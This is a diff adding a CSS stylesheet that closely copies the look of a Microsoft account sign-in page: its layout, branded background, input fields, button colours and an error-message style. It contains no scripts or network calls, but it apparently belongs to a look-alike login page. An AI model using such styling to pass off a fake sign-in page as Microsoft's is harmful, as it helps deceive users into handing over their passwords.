@@ -1,0 +1,261 @@
+* {
+    box-sizing: border-box;
+}
+
+body {
+    font-family: "Segoe UI Webfont", -apple-system, "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+    margin: 0;
+    padding: 0;
+    font-size: .9375rem;
+}
+
+.ms {
+    position: relative;
+    min-height: 100vh;
+    background: url(./image/microsoftbg.png);
+    background-size: cover;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 20px 0;
+}
+
+.ms__box {
+    margin-left: auto;
+    margin-right: auto;
+    position: relative;
+    max-width: 440px;
+    width: calc(100% - 40px);
+    padding: 44px;
+    margin-bottom: 28px;
+    background-color: #fff;
+    box-shadow: 0 2px 6px rgb(0 0 0 / 20%);
+    min-height: 340px;
+    overflow: hidden;
+}
+
+.ms__logo>img {
+    max-width: 110px;
+    height: auto;
+    margin-bottom: 20px;
+}
+
+.ms__title {
+    margin: 0;
+    font-size: 25px;
+    line-height: 20px;
+    font-weight: 600;
+    line-height: 1.25rem;
+    color: #000;
+    background-color: #fff;
+    margin-bottom: 20px;
+}
+
+.ms__box {
+    display: flex;
+    flex-direction: column;
+}
+
+.ms__input {
+    padding: 4px 8px;
+    border-style: solid;
+    border-width: 0px;
+    border-color: rgba(0, 0, 0, .4);
+    background-color: rgba(255, 255, 255, .4);
+    height: 2rem;
+    padding: 6px 10px;
+    border-width: 1px;
+    border-color: #666;
+    border-color: rgba(0, 0, 0, .6);
+    height: 36px;
+    outline: none;
+    border-radius: 0;
+    background-color: transparent;
+    border-top-width: 0;
+    border-left-width: 0;
+    border-right-width: 0;
+    padding-left: 0;
+    color: #1b1b1b;
+    margin-bottom: 20px;
+    font-size: 16px;
+}
+
+.ms__input:focus {
+    border-color: #0067b8;
+}
+
+.ms__link {
+    font-size: 13px;
+    margin-bottom: 10px;
+    line-height: 100%;
+    color: #0067b8;
+    text-decoration: none;
+}
+
+.ms__link:hover {
+    text-decoration: underline;
+    color: #666;
+}
+
+.ms__labels-container {
+    display: flex;
+    align-items: baseline;
+}
+
+.ms__labels-container>span,
+.ms__labels-container>a {
+    padding-right: 10px;
+}
+
+.ms__labels-container img {
+    max-width: 30px;
+    height: auto;
+    cursor: pointer;
+    transform: translateY(4px);
+}
+
+.ms__label {
+    cursor: pointer;
+    margin-bottom: 10px;
+}
+
+.ms__checkbox {
+    display: none;
+}
+
+.ms__checkbox-wrap {
+    display: flex;
+    align-items: center;
+    cursor: pointer;
+    margin-bottom: 15px;
+    font-size: 15px;
+}
+
+.ms__checkbox-icon {
+    display: block;
+    width: 20px;
+    height: 20px;
+    border: 1px solid #000;
+    margin-right: 7px;
+    text-align: center;
+}
+
+.ms__checkbox-icon:after {
+    font-size: 16px;
+    color: #fff;
+    display: block;
+    line-height: 100%;
+    font-weight: 600;
+}
+
+.ms__checkbox:checked+.ms__checkbox-icon {
+    background-color: rgb(101, 101, 255);
+    border-color: rgb(101, 101, 255);
+}
+
+.ms__checkbox:checked+.ms__checkbox-icon:after {
+    content: "✔";
+}
+
+.ms__button {
+    min-width: 100px;
+    padding: 7px 15px 7px 15px;
+    margin-top: 4px;
+    margin-bottom: 4px;
+    position: relative;
+    max-width: 120px;
+    text-align: center;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    touch-action: manipulation;
+    color: #000;
+    border-style: solid;
+    border-width: 2px;
+    border-color: transparent;
+    background-color: rgba(0, 0, 0, .2);
+    color: #fff;
+    border-color: #0067b8;
+    background-color: #0067b8;
+    display: block;
+    cursor: pointer;
+    align-self: flex-end;
+    font-size: 14px;
+}
+
+.ms_box-options {
+    max-width: 440px;
+    width: calc(100% - 40px);
+    background-color: #fff;
+    -webkit-box-shadow: 0 2px 6px rgb(0 0 0 / 20%);
+    -moz-box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
+    box-shadow: 0 2px 6px rgb(0 0 0 / 20%);
+    padding: 5px 45px;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+}
+
+.ms_box-options:hover {
+    background-color: #e6e6e6;
+    color: inherit;
+}
+
+.ms_box-options>img {
+    width: 40px;
+    height: auto;
+    margin-right: 10px;
+}
+
+.footer {
+    position: absolute;
+    bottom: 0;
+    left: 0;
+    width: 100%;
+    display: flex;
+    justify-content: flex-end;
+}
+
+.footer__list {
+    display: flex;
+    align-items: center;
+    list-style: none;
+    margin: 0;
+    padding: 0;
+}
+
+.footer__link {
+    margin-right: 15px;
+    text-decoration: none;
+    color: #000;
+    font-size: 12px;
+    line-height: 28px;
+    white-space: nowrap;
+}
+
+.footer__list>li:last-child>.footer__link {
+    text-decoration: none;
+    letter-spacing: 3px;
+    line-height: 22px;
+    font-size: 16px;
+    font-weight: 600;
+    display: block;
+    transform: translateY(-4px);
+}
+
+.footer__link:hover {
+    text-decoration: underline;
+}
+
+@media screen and (max-width: 520px) {
+    .ms__box {
+        padding: 15px;
+    }
+}
+
+#error_span {
+    color: red;
+    margin-top: -15px;
+    margin-bottom: 20px;
+}
